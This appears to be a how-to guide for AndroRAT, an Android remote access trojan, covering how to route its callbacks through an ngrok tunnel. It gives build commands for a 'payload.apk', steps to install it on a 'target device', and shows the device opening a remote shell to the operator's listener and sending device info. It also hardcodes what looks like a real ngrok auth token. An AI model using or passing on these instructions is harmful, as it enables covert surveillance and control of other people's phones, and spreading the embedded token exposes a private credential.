# AndroRAT Ngrok Connectivity Guide

## 🌐 How Ngrok Works with AndroRAT

Ngrok creates a **secure tunnel** between your computer and the target Android device over the internet. This allows you to control the device from anywhere, not just on your local network.

### Connection Flow:

```
Android Device (APK)
        ↓
    Ngrok Tunnel (Public URL)
        ↓
Your Computer (Listener)
```

---

## ⚙️ Ngrok Configuration Methods

### **Method 1: Hardcoded Token (Current Setup)**

The token is embedded in the APK:
```python
# androRAT.py (line 51)
ngrok_token = "3AXOS7AFLjYl0kw7f1p7Tz2ySOq_7WGCDUCoFfGtymwrARAXF"
```

✅ **Pros:**
- No extra setup needed
- Token works automatically
- APK can connect from anywhere

❌ **Cons:**
- Token visible in source code
- If token is compromised, need to regenerate

### **Method 2: Environment Variable (Recommended for CI/CD)**

Set before building:
```bash
export NGROK_AUTHTOKEN="your_token_here"
python3 androRAT.py --build --ngrok -p 8000 -o payload.apk -icon
```

The script reads:
```python
# androRAT.py (line 52-54)
ngrok_token = os.environ.get('NGROK_AUTHTOKEN')
if not ngrok_token:
    ngrok_token = "3AXOS7AFLjYl0kw7f1p7Tz2ySOq_7WGCDUCoFfGtymwrARAXF"
```

✅ **Pros:**
- Secure (not in source code)
- Perfect for GitHub Actions
- Can change token without rebuilding

❌ **Cons:**
- Need to set env var each time
- Or configure in GitHub Secrets

### **Method 3: GitHub Actions Automation**

Configure in GitHub repository:

1. Go to **Settings → Secrets and variables → Actions**
2. Click **New repository secret**
3. Name: `NGROK_AUTHTOKEN`
4. Value: Your actual ngrok token

Now the workflow can use it:
```yaml
env:
  NGROK_AUTHTOKEN: ${{ secrets.NGROK_AUTHTOKEN }}
```

---

## 📱 Does the APK Connect to Ngrok Automatically?

### **Short Answer:** YES, IF you build with `--ngrok` flag or have the token configured.

### **How It Works:**

1. **During Build (`androRAT.py --build --ngrok`):**
   - The Python script configures ngrok with your token
   - The APK is built with hardcoded connection parameters
   - When APK runs, it connects using those parameters

2. **The APK Contains:**
   ```java
   // In config.smali (compiled bytecode)
   // IP: ngrok tunnel public IP
   // PORT: ngrok tunnel public port
   ```

3. **When You Install APK on Device:**
   - App opens → automatically connects to your ngrok tunnel
   - Sends device info to your listener
   - Waits for commands

---

## 🚀 Step-by-Step: Using Ngrok with APK

### **Step 1: Get Ngrok Token**

```bash
# Sign up at https://ngrok.com
# Go to Dashboard → Your Authtoken
# Copy your token (looks like: 3AXOS7AFLjYl0kw7f1p...
```

### **Step 2: Build APK with Ngrok**

```bash
# Set your token
export NGROK_AUTHTOKEN="your_actual_token_here"

# Build the APK (will auto-start listener)
cd /workspaces/AndroRAT
python3 androRAT.py --build --ngrok -p 8000 -o payload.apk -icon
```

Output:
```
[INFO] Connecting to ngrok...
[INFO] Tunnel_IP: 123.45.67.89 PORT: 12345
[INFO] Waiting for Connections ...
```

### **Step 3: Install APK on Target Device**

1. Transfer `payload.apk` to Android device
2. Install it
3. Open the app

### **Step 4: See Connection**

**On Your Computer (Terminal):**
```
[SUCCESS] Client Connected!
android@shell:~$ 
```

**Device is now Connected!** 🎉

---

## 🔍 Verification: Check if APK Will Connect

### Method A: Use aapt to inspect APK

```bash
# Extract APK strings to see connection details
aapt dump badging payload.apk | grep -i "ip\|port\|server"
```

### Method B: Extract and decompile

```bash
# Decompile to find IP/PORT config
apktool d payload.apk
grep -r "192.168\|0.0.0.0\|127.0.0.1" payload/
```

### Method C: Just test it!

1. Install APK
2. Open listener on your PC
3. Check if it connects

---

## 🐛 Troubleshooting Ngrok Connection

| Problem | Solution |
|---------|----------|
| "Connection refused" | Check ngrok tunnel is running and public URL is correct |
| "No client connected" | Verify APK has correct IP and port (check with aapt dump) |
| "Ngrok auth failed" | Token expired or invalid. Get new one from ngrok.com |
| "Connection timeout" | Check Android device has internet access (WiFi/Mobile data) |
| "Tunnel limit exceeded" | Upgrade ngrok account or use different token |
| APK won't connect even with ngrok | Rebuild APK with correct `--ngrok` flag |

---

## 📊 Current Status: AndroRAT + Ngrok

| Feature | Status | Details |
|---------|--------|---------|
| Ngrok Support | ✅ Yes | Built-in, auto-configured |
| Token Config | ✅ Yes | Hardcoded + Environment variable support |
| APK Auto-Connect | ✅ Yes | When built with `--ngrok` flag |
| Internet Remote Control | ✅ Yes | Works from anywhere with ngrok |
| GitHub Actions | ⏳ Manual | Use `secrets.NGROK_AUTHTOKEN` when ready |
| Secure Tunneling | ✅ Yes | Ngrok provides encryption |

---

## 🔐 Security Recommendations

1. **Keep Token Secret:**
   - Don't commit token to git
   - Use GitHub Secrets for CI/CD
   - Regenerate if accidentally exposed

2. **Use Environment Variables:**
   ```bash
   export NGROK_AUTHTOKEN="your_secret_token"
   # Don't hardcode in source!
   ```

3. **Monitor Ngrok Dashboard:**
   - Check active tunnels
   - Disable tunnels when not in use
   - Monitor data usage

4. **For Testing Only:**
   - Ensure you have permission to test devices
   - Follow legal/ethical guidelines
   - Use responsibly

---

## 📖 Reference

- **Ngrok Docs:** https://ngrok.com/docs
- **Ngrok Auth Tokens:** https://dashboard.ngrok.com/get-started/your-authtoken
- **AndroRAT Python Script:** `androRAT.py` (--ngrok flag)
- **Config File:** `Compiled_apk/smali/.../config.smali`

---

## ✅ Summary

**Yes, the APK WILL connect to ngrok for internet connectivity, IF:**

1. ✅ You build it with `python3 androRAT.py --build --ngrok`
2. ✅ You have a valid ngrok token configured
3. ✅ The ngrok tunnel is active on your computer
4. ✅ The target device has internet access

**The connection happens automatically** - no manual setup needed on the device side!

